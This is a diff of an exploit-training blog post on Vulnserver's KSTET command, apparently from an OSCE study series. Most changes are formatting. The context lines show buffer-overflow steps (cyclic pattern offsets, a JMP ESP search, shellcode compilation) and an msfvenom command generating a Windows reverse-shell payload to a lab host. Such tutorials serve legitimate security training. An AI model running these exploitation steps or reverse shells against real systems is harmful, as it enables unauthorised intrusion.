@@ -5,7 +5,7 @@
 :tags: osce, vulnserver, training, exploit
 :image: cover.png
 :alt: Photo by Ganapathy Kumar on Unsplash
-:description: This series of posts deal on hacking Vulnserver, a Vulnerable-by-Design application that can used to practice Windows explotation. We've been faced to several kinds of restrictions and we've been able to overcome them. This post will show how to exploit the KSTET command using a different method.
+:description: This post will show how to exploit the Vulnserver KSTET command using a socket reuse method.
 :keywords: Bussiness, Information, Security, Protection, Hacking, Exploit, OSCE
 :author: Andres Roldan
 :writer: aroldan
@@ -44,7 +44,7 @@ the security of any target.
 
 Let's check how the `KSTET` command behaves:
 
-[source,bash]
+[source,console]
 ----
 $ telnet 192.168.0.20 9999
 Trying 192.168.0.20...
@@ -140,7 +140,7 @@ easy if we can do it the hard way?
 Ok, let's start by checking the offset of the crash, by creating a cyclic
 pattern of 100 characters using `pattern_create.rb` tool from Metasploit:
 
-[source,bash]
+[source,console]
 ----
 $ msf-pattern_create -l 100
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
@@ -175,7 +175,7 @@ As you can see, `EIP` was overwritten with `63413363`. We can check the
 offset of that bytes on our cyclic pattern to get the offset on where `EIP`
 gets overwritten:
 
-[source,bash]
+[source,console]
 ----
 $ msf-pattern_offset -q 63413363
 [*] Exact match at offset 70
@@ -218,7 +218,7 @@ points directly to our controlled buffer. That means that we can look for
 a `JMP ESP` instruction and overwrite `EIP` with its address to take
 control of the execution flow. We can do that using `mona.py` plugin:
 
-[source,bash]
+[source,console]
 ----
 !mona jmp -r esp -cp nonull -o
 ----
@@ -431,7 +431,7 @@ jnz socket_loop         ; If recv() failed, jump back to the socket loop where
 
 That looks better. We can compile that using `nasm`:
 
-[source,bash]
+[source,console]
 ----
 $ nasm -f elf32 -o shellcode.o shellcode.asm
 ----
@@ -499,7 +499,7 @@ call, we are not limited by bad chars on the shellcode.
 
 Let's create it:
 
-[source,bash]
+[source,console]
 ----
 $ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.18 LPORT=4444 EXITFUNC=none -f python -v SHELL
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
